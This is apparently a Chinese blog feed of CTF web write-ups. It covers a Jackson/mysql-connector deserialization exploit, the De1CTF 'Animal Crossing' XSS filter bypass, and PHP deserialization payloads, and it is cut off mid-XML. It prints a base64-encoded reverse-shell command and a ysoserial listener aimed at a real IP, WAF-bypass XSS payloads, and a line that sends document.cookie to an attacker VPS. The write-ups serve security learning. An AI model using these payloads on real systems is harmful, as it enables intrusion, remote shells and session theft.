<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ctf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.reporing.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporing.outputEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sparkjava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-nop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assemble<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">     </span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用了Jackson 2.9.9之前的Java应用，如果服务依赖了mysql-connector-java，那么这个服务所在机器上的文件，就可能被任意读取。</p>
</blockquote>
<p>commons-collections 是3.2.1</p>
<p>参考<a href="https://www.jianshu.com/p/dfd6f0ac9f00" target="_blank" rel="noopener">https://www.jianshu.com/p/dfd6f0ac9f00</a></p>
<p><a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener">https://github.com/fnmsd/MySQL_Fake_Server</a></p>
<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200625105055219.png" alt="image-20200625105055219"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#DNSlog查看</span><br><span class="line">&#123;&quot;id&quot;:[&quot;com.mysql.cj.jdbc.admin.MiniAdmin&quot;,&quot;jdbc:mysql:&#x2F;&#x2F;144.34.200.151:3306&#x2F;test?autoDeserialize&#x3D;true%20queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor%20user&#x3D;yso_URLDNS_http:&#x2F;&#x2F;j5q6o0.dnslog.cn&quot;]&#125;</span><br><span class="line"></span><br><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener  8888 CommonsCollections5 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMjAwLjE1MS84ODg4IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br><span class="line">#反弹shell</span><br><span class="line">&#123;&quot;id&quot;:[&quot;com.mysql.cj.jdbc.admin.MiniAdmin&quot;,&quot;jdbc:mysql:&#x2F;&#x2F;144.34.200.151:3306&#x2F;test?autoDeserialize&#x3D;true%26queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor%26user&#x3D;yso_CommonsCollections6_bash%20-c%20&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMjAwLjE1MS84ODg4IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/image-20200625104839414.png" alt="image-20200625104839414"></p>
<h1 id="0x05-laravel"><a href="#0x05-laravel" class="headerlink" title="0x05 laravel"></a>0x05 <strong>laravel</strong></h1>]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF Animal Crossing 复现</title>
    <url>/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>记录复现DE1CTF 的Animal Crossing</p>
<a id="more"></a>

<h1 id="Animal-Crossing"><a href="#Animal-Crossing" class="headerlink" title="Animal Crossing"></a>Animal Crossing</h1><p>题目是一个可以自己编辑的通行证，然后可以将编辑好的链接发送给管理员，那么就应该是xss打cookie了.</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514120745790.png" alt="image-20200514120745790"></p>
<p>首先发现存在CSP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;object-src &#39;none&#39;;</span><br></pre></td></tr></table></figure>

<p>上述CSP可以利用<code>location.href  =  &quot;http://dddddd&quot;+document.cookie</code>来绕过.</p>
<p>经过测试发现对island和image和fruit都进行了编码，然后对data数据进行了检测，比赛时没有探测出检测的规则（其实时不会xss）,赛后看了官方的writeup知道题目设置了两层waf</p>
<blockquote>
<h3 id="第一层：黑名单检测"><a href="#第一层：黑名单检测" class="headerlink" title="第一层：黑名单检测"></a>第一层：黑名单检测</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var blackList &#x3D; []string&#123;</span><br><span class="line">	&#x2F;&#x2F;global</span><br><span class="line">	&quot;document&quot;, &quot;window&quot;, &quot;top&quot;, &quot;parent&quot;, &quot;global&quot;, &quot;this&quot;,</span><br><span class="line">	&#x2F;&#x2F;func</span><br><span class="line">	&quot;console&quot;, &quot;alert&quot;, &quot;log&quot;, &quot;promise&quot;, &quot;fetch&quot;, &quot;eval&quot;, &quot;import&quot;,</span><br><span class="line">	&#x2F;&#x2F;char</span><br><span class="line">	&quot;&lt;&quot;, &quot;&gt;&quot;, &quot;&#96;&quot;, &quot;\\*&quot;, &quot;&amp;&quot;, &quot;#&quot;, &quot;%&quot;, &quot;\\\\&quot;,</span><br><span class="line">	&#x2F;&#x2F;key</span><br><span class="line">	&quot;if&quot;, &quot;set&quot;, &quot;get&quot;, &quot;with&quot;, &quot;yield&quot;, &quot;async&quot;, &quot;wait&quot;, &quot;func&quot;, &quot;for&quot;, &quot;error&quot;, &quot;string&quot;,</span><br><span class="line">	&#x2F;&#x2F;string</span><br><span class="line">	&quot;href&quot;, &quot;location&quot;, &quot;url&quot;, &quot;cookie&quot;, &quot;src&quot;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>黑名单的绕过思路无非避开被ban的字符串和字符，这里因为go的iris框架问题（看不出来是golang吧），导致<code>;</code>后的东西会被删掉，可以用%0a绕过</p>
<h3 id="第二层：静态语法分析"><a href="#第二层：静态语法分析" class="headerlink" title="第二层：静态语法分析"></a>第二层：静态语法分析</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 将data传入&#96;fmt.Sprintf(&quot;&#39;%s&#39;;&quot;, data)&#96;，然后进行语法解析，这里parse失败直接ban</span><br><span class="line">2. 接着遍历AST进行分析：</span><br><span class="line">   1. VariableExpression&#x2F;AssignExpression，所有声明语句&#x2F;赋值语句直接ban</span><br><span class="line">   2. CallExpression，所有函数调用的，且callee不为Identifier的直接ban</span><br><span class="line">      1. ban：&#96;test.test()&#96;、&#96;a[x]()&#96;</span><br><span class="line">      2. pass：&#96;test()&#96;</span><br><span class="line">   3. BracketExpression，也就是成员引用，Member不为Identifier的直接ban，</span><br><span class="line">      1. ban：&#96;a[1]&#96;、&#96;a[&#39;xx&#39;]&#96;</span><br><span class="line">      2. pass：&#96;a[x]&#96;</span><br></pre></td></tr></table></figure>

<p>这一层waf，其实只要摸清ban的套路，针对性找到没被处理的语法来绕过即可，这里我的预期解是用throw传递变量，但是还有很多其他能用的语法（事实证明确实有很多)</p>
</blockquote>
<p>有黑名单的检测还有对语法的检测，这里如果解析语法出错直接ban，然后禁止声明和赋值语句，</p>
<blockquote>
<p>VariableExpression（变量表达式）</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514175330303.png" alt="image-20200514175330303"></p>
<p>AssignExpression（赋值语句）</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514183823187.png" alt="image-20200514183823187"></p>
<p>Identifier（标识符）</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514183717571.png" alt="image-20200514183717571"></p>
<p>CallExpression（调用表达式）</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514183650960.png" alt="image-20200514183650960"></p>
<p>BracketExpression（括号表达式，就是成员引用）</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514183743248.png" alt="image-20200514183743248"></p>
</blockquote>
<p>综上，在data中不能出现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let a &#x3D; &#39;dd&#39;;</span><br><span class="line">a &#x3D; &quot;ddddd&quot;;</span><br><span class="line">window.open(&quot;dd&quot;);</span><br><span class="line">window[&#39;open&#39;](&quot;dd&quot;);</span><br><span class="line">等等之类的</span><br></pre></td></tr></table></figure>

<p>这里现贴上出题人的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">YWxlcnQoMSk&#x3D;%27%0atry&#123;throw%20%27ev%27%2b%27al%27&#125;catch(e)&#123;try&#123;throw%20frames[e]&#125;catch(c)&#123;c(atob(data))&#125;&#125;%0a&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>alert(1)&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;YWxlcnQoMSk=</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514200937385.png" alt="image-20200514200937385"></p>
<p>把题目里的部分代码抠出来，出题人的payload如下图所示：</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514210649103.png" alt="image-20200514210649103"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">data=<span class="string">'YWxlcnQoMSk='</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">'ev'</span> + <span class="string">'al'</span></span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> frames[e]</span><br><span class="line">    &#125; <span class="keyword">catch</span>(c) &#123;</span><br><span class="line">        c(atob(data))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>测试发现确实能够绕过waf，之前也没有用过go,所以出题人的这句话没清楚什么意思，有知道的师傅可以给我讲讲。</p>
<blockquote>
<p>这里因为go的iris框架问题（看不出来是golang吧），导致<code>;</code>后的东西会被删掉，可以用%0a绕过</p>
</blockquote>
<p>将<code>location.href = &quot;http://vps:8888/?flag=&quot;+document.cookie</code>base64编码，然后发过去</p>
<p>另外记录下一叶飘零师傅的payload，感觉采用的方法和NPUCTF的验证🐎那道题很像，先贴出payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data&#x3D;&#39;||&#123;%22valueOf%22:new%20%22%22.constructor.constructor(atob(%27YWxlcnQoMSk&#x3D;%27))&#125;%2b1&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514230451345.png" alt="image-20200514230451345"></p>
<p>原理是利用</p>
<blockquote>
<p>在一元加操作符操作对象的时候，会先调用对象的valueOf方法来转换，</p>
</blockquote>
<p>从之前的验证码那题可以知道，Math+1会因为Object与字符串拼接后原型会变成String，然后String的constructor为Function，这里利用<code>new &#39;&#39;.constructor.constructor(atob(&#39;YWxlcnQoMSk=&#39;))</code>得到一个函数，但是不能自动执行，</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514231244338.png" alt="image-20200514231244338"></p>
<p>从前面也看到waf ban了test.test()这种形式的函数，然后就可以利用前面的trick来进行函数的触发，如下图所示：</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514231918146.png" alt="image-20200514231918146"></p>
<p>然后将</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">btoa(&#39;location&#x3D;&quot;http:&#x2F;&#x2F;ip&#x2F;?flag&#x3D;&quot;+document.cookie&#39;)</span><br><span class="line"></span><br><span class="line">&#x2F;passport?image&#x3D;%2Fstatic%2Fhead.jpg&amp;island&#x3D;mount&amp;fruit&#x3D;&amp;name&#x3D;mount&amp;data&#x3D;&#39;||&#123;%22valueOf%22:new%20%22%22.constructor.constructor(atob(%27ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd%27))&#125;%2b1&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>在本地用docker复现时老是报500，遂罢。</p>
<p>这样这得到了半个flag，然后要得到后半部分要读出服务器的400张图片，这点可以通过读取document.body.innerHTML来得到，然后后面有三种方法去得到这400张图片</p>
<p>法一：</p>
<ol>
<li>将截图库放到png，上传到/upload,绕过CSP，执行截图库</li>
<li>然后利用<code>fetch(</code>/static/images/xxxxxxxxx.png<code>).then(res=&gt;res.text()).then(txt=&gt;eval(txt))</code>执行</li>
</ol>
<p>法二：</p>
<blockquote>
<p>用for循环把400个图全部传到/upload，获取400个图片地址然后回传</p>
</blockquote>
<p>法三：</p>
<blockquote>
<p>直接读取图片回传，可以是写脚本一张一张传，也可以是用for循环批量传，但是回传过程需要编码转换，传回去后也需要再转成图片进行拼接</p>
</blockquote>
<p>参考</p>
<p><a href="https://www.codemonster.cn/2020/05/06/2020-de1ctf-animal-crossing-writeup/#more" target="_blank" rel="noopener">https://www.codemonster.cn/2020/05/06/2020-de1ctf-animal-crossing-writeup/#more</a></p>
<p><a href="https://www.4hou.com/posts/EGlN" target="_blank" rel="noopener">https://www.4hou.com/posts/EGlN</a></p>
<p><a href="https://segmentfault.com/a/1190000015660623" target="_blank" rel="noopener">https://segmentfault.com/a/1190000015660623</a></p>
]]></content>
  </entry>
  <entry>
    <title>2020年网鼎杯WEB-writeup</title>
    <url>/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/</url>
    <content><![CDATA[<p>被队友带飞，队友👍👍👍</p>
<a id="more"></a>

<h1 id="0x01-AreUSerialz"><a href="#0x01-AreUSerialz" class="headerlink" title="0x01 AreUSerialz"></a>0x01 AreUSerialz</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$a-&gt;op = <span class="number">2</span>;</span><br><span class="line">$a-&gt;filename = <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:11:"FileHandler":3:&#123;s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;&#125;</span></span><br></pre></td></tr></table></figure>

<p>很意外为啥把上面的3改成2就好了，</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510195659225.png" alt="image-20200510195659225"></p>
<p>然后在本地试了试，好像跟php的版本和SAPI有关，</p>
<p>php以cli方式运行时候是不用修改3变成2的，本地测试php7.2.1和7.3.15版本将protected改成public属性是可以成功的，其他版本不可以</p>
<ul>
<li>php 7.2.1</li>
</ul>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511103022778.png" alt="image-20200511103022778"></p>
<ul>
<li>php 7.1.13</li>
</ul>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511103058029.png" alt="image-20200511103058029"></p>
<ul>
<li>php 5.3.29</li>
</ul>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511103127750.png" alt="image-20200511103127750"></p>
<p>然后本地7版本时候，不用把3改成2也可以，但是在题目环境不改3的话不能成功。虚拟机里也是和题目环境一样。</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510201328743.png" alt="image-20200510201328743"></p>
<p>win 10 phpstudy php7.2.1</p>
<p>ps：添加了一个var_dump(scandir(‘.’));输出的是php.exe的路径。</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510202256996.png" alt="image-20200510202256996"></p>
<p>这里是sapi的原因(试了apache和nginx都不可以)，如果要读的话要用绝对路径</p>
<blockquote>
<p><strong>Note</strong>:</p>
<p>析构函数在脚本关闭时调用，此时所有的 HTTP 头信息已经发出。脚本关闭时的工作目录有可能和在 SAPI（如 apache）中时不同。</p>
<p><a href="https://www.php.net/manual/zh/language.oop5.decon.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.decon.php</a></p>
</blockquote>
<p>另外如果把3改成2的话也是可以读的</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511095452622.png" alt="image-20200511095452622"></p>
<p>phpstudy7.2.10外其他版本均读不了flag文件。</p>
<p>后来看到p神之前分享过</p>
<blockquote>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511215419050.png" alt="image-20200511215419050"></p>
<p><a href="https://blog.csdn.net/a3320315/article/details/105215741" target="_blank" rel="noopener">参考</a></p>
</blockquote>
<p>然后还有一种解法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">"FileHandler"</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">"\00*\00op"</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">"\00*\00filename"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;S:<span class="number">10</span>:<span class="string">"\00*\00content"</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511215516506.png" alt="image-20200511215516506"></p>
<h1 id="0x02-filejava"><a href="#0x02-filejava" class="headerlink" title="0x02 filejava"></a>0x02 filejava</h1><p>上传完文件可以看下载文件处有任意文件读取漏洞，</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510214503572.png" alt="image-20200510214503572"></p>
<p>都配置文件</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510214652887.png" alt="image-20200510214652887"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"</span> <span class="attr">id</span>=<span class="string">"WebApp_ID"</span> <span class="attr">version</span>=<span class="string">"2.5"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>file_in_java<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>upload.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span 